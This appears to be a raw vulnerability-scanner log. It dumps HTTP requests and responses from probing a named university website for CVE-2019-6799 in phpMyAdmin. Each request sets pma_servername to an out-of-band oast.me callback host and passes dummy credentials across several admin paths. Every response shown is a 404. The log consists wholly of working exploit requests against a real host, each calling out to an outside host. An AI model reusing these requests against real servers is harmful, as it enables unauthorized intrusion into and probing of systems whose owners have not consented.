@@ -1,0 +1,264 @@
+[CVE-2019-6799] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au/pma/index.php?pma_servername=d29n3paus8n0ghhurvjgr8j4i6agzdi3f.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+
+GET /pma/index.php?pma_servername=d29n3paus8n0ghhurvjgr8j4i6agzdi3f.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1 HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[CVE-2019-6799] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au/pma/index.php?pma_servername=d29n3paus8n0ghhurvjgr8j4i6agzdi3f.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 536
+Age: 1
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:59 GMT
+Server: AmazonS3
+Via: 1.1 31018efa0f6c4b43ab018b8f561f340a.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: LjFDTc8tFmk0YQvhbEAJ_NEAav53FsO-omKbOpTc93pbx4mApV44yA==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<h1>404 Not Found</h1>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: 404.html</li>
+<li>RequestId: 2MP3SAEWT8QB0KK7</li>
+<li>HostId: YxdRLMd/aAVzUvW3shK65D57rdzxEKPJyx3UiJWW9mc17qEQteQvpJ6wrPjHiydr3UhSQnSn7/Q=</li>
+</ul>
+<h3>An Error Occurred While Attempting to Retrieve a Custom Error Document</h3>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: error.html</li>
+</ul>
+<hr/>
+</body>
+</html>
+
+[CVE-2019-6799] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au/pmd/index.php?pma_servername=d29n3paus8n0ghhurvjgaijdbkfn5wma4.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+
+GET /pmd/index.php?pma_servername=d29n3paus8n0ghhurvjgaijdbkfn5wma4.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1 HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[CVE-2019-6799] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au/pmd/index.php?pma_servername=d29n3paus8n0ghhurvjgaijdbkfn5wma4.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 536
+Age: 1
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:59 GMT
+Server: AmazonS3
+Via: 1.1 dbbdffd5abd9b6fb9357259f8ea93f44.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: 0snRl0NdFYZJOMRvvFpYpYGlY7udbLdlygCnNFnbetOunAwFKE6G8g==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<h1>404 Not Found</h1>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: 404.html</li>
+<li>RequestId: 2MP3SAEWT8QB0KK7</li>
+<li>HostId: YxdRLMd/aAVzUvW3shK65D57rdzxEKPJyx3UiJWW9mc17qEQteQvpJ6wrPjHiydr3UhSQnSn7/Q=</li>
+</ul>
+<h3>An Error Occurred While Attempting to Retrieve a Custom Error Document</h3>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: error.html</li>
+</ul>
+<hr/>
+</body>
+</html>
+
+[CVE-2019-6799] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au/_phpmyadmin/index.php?pma_servername=d29n3paus8n0ghhurvjg49m84hjtwxd4r.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+
+GET /_phpmyadmin/index.php?pma_servername=d29n3paus8n0ghhurvjg49m84hjtwxd4r.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1 HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[CVE-2019-6799] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au/_phpmyadmin/index.php?pma_servername=d29n3paus8n0ghhurvjg49m84hjtwxd4r.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 536
+Age: 1
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:59 GMT
+Server: AmazonS3
+Via: 1.1 f8513f043bb0905bbc74a0542f2b9082.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: gC3UnLwzjO9ECRjQqRzRmQ4z6hOqBx3Tnkyi7SMvJNMn0MLVH5t5sw==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<h1>404 Not Found</h1>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: 404.html</li>
+<li>RequestId: 2MP3SAEWT8QB0KK7</li>
+<li>HostId: YxdRLMd/aAVzUvW3shK65D57rdzxEKPJyx3UiJWW9mc17qEQteQvpJ6wrPjHiydr3UhSQnSn7/Q=</li>
+</ul>
+<h3>An Error Occurred While Attempting to Retrieve a Custom Error Document</h3>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: error.html</li>
+</ul>
+<hr/>
+</body>
+</html>
+
+[CVE-2019-6799] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au/phpMyAdmin/index.php?pma_servername=d29n3paus8n0ghhurvjg7c4io1k17e7uj.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+
+GET /phpMyAdmin/index.php?pma_servername=d29n3paus8n0ghhurvjg7c4io1k17e7uj.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1 HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[CVE-2019-6799] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au/phpMyAdmin/index.php?pma_servername=d29n3paus8n0ghhurvjg7c4io1k17e7uj.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 536
+Age: 1
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:59 GMT
+Server: AmazonS3
+Via: 1.1 1f0befe1f0c7d5efec2c028b0e0af7ea.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: xyOq9jk7k9aLpwKldRnDCPFPEJnqIk8-x1gASS66pji_4cVJvbDPRA==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<h1>404 Not Found</h1>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: 404.html</li>
+<li>RequestId: 2MP3SAEWT8QB0KK7</li>
+<li>HostId: YxdRLMd/aAVzUvW3shK65D57rdzxEKPJyx3UiJWW9mc17qEQteQvpJ6wrPjHiydr3UhSQnSn7/Q=</li>
+</ul>
+<h3>An Error Occurred While Attempting to Retrieve a Custom Error Document</h3>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: error.html</li>
+</ul>
+<hr/>
+</body>
+</html>
+
+[CVE-2019-6799] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au/phpmyadmin/index.php?pma_servername=d29n3paus8n0ghhurvjgfbmhiwh7s87nz.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+
+GET /phpmyadmin/index.php?pma_servername=d29n3paus8n0ghhurvjgfbmhiwh7s87nz.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1 HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[CVE-2019-6799] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au/index.php?pma_servername=d29n3paus8n0ghhurvjgdfap89ngryh4b.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+
+GET /index.php?pma_servername=d29n3paus8n0ghhurvjgdfap89ngryh4b.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1 HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[CVE-2019-6799] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au/phpmyadmin/index.php?pma_servername=d29n3paus8n0ghhurvjgfbmhiwh7s87nz.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 536
+Age: 1
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:59 GMT
+Server: AmazonS3
+Via: 1.1 eafa30ac9eebc826d698b6b51868b24a.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: 2iknAIVo69pjSd-eODEhueqh29kaowC7hYGb-5Mv8AVfYAz37U9fkA==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<h1>404 Not Found</h1>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: 404.html</li>
+<li>RequestId: 2MP3SAEWT8QB0KK7</li>
+<li>HostId: YxdRLMd/aAVzUvW3shK65D57rdzxEKPJyx3UiJWW9mc17qEQteQvpJ6wrPjHiydr3UhSQnSn7/Q=</li>
+</ul>
+<h3>An Error Occurred While Attempting to Retrieve a Custom Error Document</h3>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: error.html</li>
+</ul>
+<hr/>
+</body>
+</html>
+
+[CVE-2019-6799] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au/index.php?pma_servername=d29n3paus8n0ghhurvjgdfap89ngryh4b.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 536
+Age: 1
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:59 GMT
+Server: AmazonS3
+Via: 1.1 dbbdffd5abd9b6fb9357259f8ea93f44.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: CG5Z-T-duB4wbQR5Vf5_19pT8a_W_pbzs9HkFnZ06_sRXFvQru8faQ==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<h1>404 Not Found</h1>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: 404.html</li>
+<li>RequestId: 2MP3SAEWT8QB0KK7</li>
+<li>HostId: YxdRLMd/aAVzUvW3shK65D57rdzxEKPJyx3UiJWW9mc17qEQteQvpJ6wrPjHiydr3UhSQnSn7/Q=</li>
+</ul>
+<h3>An Error Occurred While Attempting to Retrieve a Custom Error Document</h3>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: error.html</li>
+</ul>
+<hr/>
+</body>
+</html>
+
